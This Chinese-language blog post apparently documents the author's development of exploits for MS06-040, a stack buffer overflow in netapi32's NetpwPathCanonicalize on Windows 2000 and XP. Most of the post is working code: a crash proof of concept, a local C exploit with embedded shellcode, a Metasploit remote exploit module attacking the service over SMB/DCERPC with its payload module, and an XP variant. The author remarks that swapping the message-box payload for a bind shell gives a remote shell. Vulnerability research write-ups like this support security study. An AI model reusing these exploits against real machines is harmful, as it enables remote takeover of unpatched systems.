---
layout:		post
title:		RPC入侵：MS06-040
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows 2000 sp4  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

编译POC, 运行

```
#include"stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

int main()
{	
	char path[0x320];
	char can_path[0x440];
	int maxbuf=0x440;
	char prefix[0x100];
	long pathtype=44;

	HINSTANCE LibHandle;
	MYPROC Trigger;

	char dll[ ] = "./netapi32.dll";
	char VulFunc[ ] = "NetpwPathCanonicalize";
	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

	memset(path,0,sizeof(path));
	memset(path,'a',sizeof(path)-2);
	memset(prefix,0,sizeof(prefix));
	memset(prefix,'b',sizeof(prefix)-2);
	
	(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
	FreeLibrary(LibHandle);

	return 0;
}
```

程序崩溃掉, OD附加上去, EIP被"aaaa"填充

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x00.png)

执行文件拖到OD, 单步来到call netapi32.NetpwPathCanonicalize, 再往下程序崩掉

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x01.png)

跟进NetpwPathCanonicalize函数, 执行MSVCRT.wcscat, 当retn时程序再次崩溃

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x02.png)

此处应该就是崩溃点, 在IDA定位到该函数

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x03.png)

copy"bbbbbb..."串到栈上

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x04.png)

"bbbbb..."串尾部拼接一个0x005C

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x05.png)

继续拼接"aaaaa..."串, 覆盖返回地址

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x06.png)


### 0x01 本地exploit

观察在retn时, ecx指向缓冲区的开始

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x07.png)

可以把shellcode布置在"bbbbbb...."串里, 用一条call/jmp ecx跳到栈上执行

```
// ms06_040_exp.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

char shellcode[]=
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

int main()
{	
	char path[0x320];
	char can_path[0x440];
	int maxbuf=0x440;
	char prefix[0x100];
	long pathtype=44;
	
	HINSTANCE LibHandle;
	MYPROC Trigger;

	char dll[] = "./netapi32.dll";
	char VulFunc[] = "NetpwPathCanonicalize";

	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

	memset(path,0,sizeof(path));
	memset(path,0x90,sizeof(path)-2);
	memset(prefix,0,sizeof(prefix));
	memset(prefix,'a',sizeof(prefix)-2);
	memcpy(prefix,shellcode,113);

	path[0x318]=0xF9;		// call ecx
	path[0x319]=0x52;
	path[0x31A]=0x18;
	path[0x31B]=0x75;

	(Trigger)(path,can_path,maxbuf,prefix,&pathtype,0);
	FreeLibrary(LibHandle);

	return 0;
}
```

pwn~

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x08.png)


### 0x02 远程exploit

```
##
# Author: wooy0ung
# Date:	2018/01/15
##

require 'msf/core'

module Metasploit3
  CachedSize = 200

  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Warning Box',
      'Description'   => 'Only for Version under Windows 7',
      'Author'        => [ 'wooy0ung' ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Payload'       =>
        {
          'Payload' =>
           	"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"+
		"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"+
		"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"+
		"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"+
		"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"+
		"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"+
		"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"+
		"\xd7"
        }
      ))
  end

end
```

以上是一段弹出警告框的payload，新建一个文本贴入以上代码，保存为warning.rb

```
##
# Author: wooy0ung
# Date:	2018/01/15
##

require 'msf/core'  

class Metasploit3 < Msf::Exploit::Remote  
	Rank = GoodRanking

	include Exploit::Remote::DCERPC
	include Exploit::Remote::SMB::Client

	def initialize(info = {})

		super(update_info(info,
			'Name'           =>     "MS06-040 RPC Exploit",
			'Description'    => 	'Only for Windows 2000 Professional sp0',
      		        'Author'         => 	[ 'wooy0ung' ],
			'Platform'       =>	"win",
			'DefaultOptions' =>	{'EXITFUNC' => 'thread',},
			'DefaultTarget'  => 	0,
			'Targets'        =>	[['Windows 2000 Professional sp0',  {'Ret' => [0x318 , 0x74FB62C3] }]]))

		register_options([OptString.new('SMBPIPE', [ true,  "The pipe name to use (BROWSER, SRVSVC)", 'BROWSER']),], self.class) 

	end

	def exploit

		connect()
		smb_login()

		handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188','3.0','ncacn_np',["\\#{datastore['SMBPIPE']}"])
		dcerpc_bind(handle)

		prefix = payload.encoded + make_nops(0x100 - payload.encoded.length - 2) + "\x00\x00"

		path = make_nops(0x318) + [target['Ret'][1]].pack('V') + 
		"\x04\xD0\xFD\x7F" * 5 +		# 可写地址(这里原本是崩溃函数传入的5个参数)
		"\x66\x81\xEC\x30\x04" +		# sub esp,430 (0x100 + 0x318 + 4 * 6 = 0x430 将esp指向payload起始)
		"\x8B\xC4" + 				# mov eax, esp
		"\xFF\xE4" +				# jmp esp
		"\x00\x00"				# Unicode结束符

		stub =	NDR.long(rand(0xffffffff)) +
			NDR.UnicodeConformantVaryingString('') +
			NDR.UnicodeConformantVaryingStringPreBuilt(path) +
			NDR.long(rand(250)+1) +
			NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +
			NDR.long(rand(250)+1) +
			NDR.long(0)	

		begin
  			dcerpc.call(0x1f, stub, false)
			rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			rescue => e
  			if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
    			  raise e
  			end
    	        end

	       handler
    	       disconnect

  	end  
end
```

以上则是利用脚本，保存为ms06_040.rb，主要是构造shellcode(在path做ROP，跳到prefix中执行payload)，在Windows 2000下利用起来比较容易，不再作解释

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x09.png)

选择之前保存的exp和payload，设置好靶机ip，pwn~

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x10.png)

当然，将普通弹框换成bind_shell的payload就可以拿到shell了~


### 0x03 exploit xp(sp0)

利用思路是：先调用一次NetpwPathCanonicalize()，此时栈上填充一部分数据但不足够溢出；再次调用NetpwPathCanonicalize()，而且此时不对栈数据初始化，将第二次的数据拼接上去。

```
#include "stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

#define PATH1_SIZE      (0xc2*2)
#define PATH2_SIZE      (0x167*2)
#define OUTBUF_SIZE     0x440
#define PREFIX_SIZE     0x410

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"				// 放置一些垃圾数据防止压栈操作破坏payload
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

int main()
{	
	char PathName1[PATH1_SIZE];
	char PathName2[PATH2_SIZE];
	char Outbuf[OUTBUF_SIZE];
	int OutbufLen=OUTBUF_SIZE;
	char Prefix1[PREFIX_SIZE];
	char Prefix2[PREFIX_SIZE];
	long PathType1=44;
	long PathType2=44;
	
	HINSTANCE LibHandle;
	MYPROC Trigger;
	char dll[ ] = "./netapi32.dll"; 
	char VulFunc[ ] = "NetpwPathCanonicalize";

	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

    // fill PathName
	memset(PathName1,0,sizeof(PathName1));
	memset(PathName1,0,sizeof(PathName1));
	memset(PathName1,'a',sizeof(PathName1)-2);
	memcpy(PathName1,shellcode,sizeof(shellcode));

	memset(PathName2,0,sizeof(PathName2));
	memset(PathName2,0,sizeof(PathName2));
	memset(PathName2,'b',sizeof(PathName2)-2);

	PathName2[0x2AE] = 0xDA;		// call ecx   0x71BD03DA
	PathName2[0x2AF] = 0x03;
	PathName2[0x2B0] = 0xBD;
	PathName2[0x2B1] = 0x71;

	PathName2[0x2B2] = 0x10;		// 以下5个可写地址
	PathName2[0x2B3] = 0xF2;
	PathName2[0x2B4] = 0xFD;
	PathName2[0x2B5] = 0x7F;

	PathName2[0x2B6] = 0x10;
	PathName2[0x2B7] = 0xF2;
	PathName2[0x2B8] = 0xFD;
	PathName2[0x2B9] = 0x7F;

	PathName2[0x2BA] = 0x10;
	PathName2[0x2BB] = 0xF2;
	PathName2[0x2BC] = 0xFD;
	PathName2[0x2BD] = 0x7F;

	PathName2[0x2BE] = 0x10;
	PathName2[0x2BF] = 0xF2;
	PathName2[0x2C0] = 0xFD;
	PathName2[0x2C1] = 0x7F;

	PathName2[0x2C2] = 0x10;
	PathName2[0x2C3] = 0xF2;
	PathName2[0x2C4] = 0xFD;
	PathName2[0x2C5] = 0x7F;

    // set Prefix as a null string
	memset(Prefix1,0,sizeof(Prefix1));
	memset(Prefix2,0,sizeof(Prefix2));

    // call NetpwPathCanonicalize several times to overflow
	(Trigger)(PathName1,Outbuf,1        ,Prefix1,&PathType1,0);
	(Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&PathType2,0);

	FreeLibrary(LibHandle);

	return 0;
}
```

pwn~

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x11.png)


### 0x04 后记

看了metasploit的exploits模块里MS06-040的利用脚本，发现这个洞一直影响到XP和Server 2003版本。

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x12.png)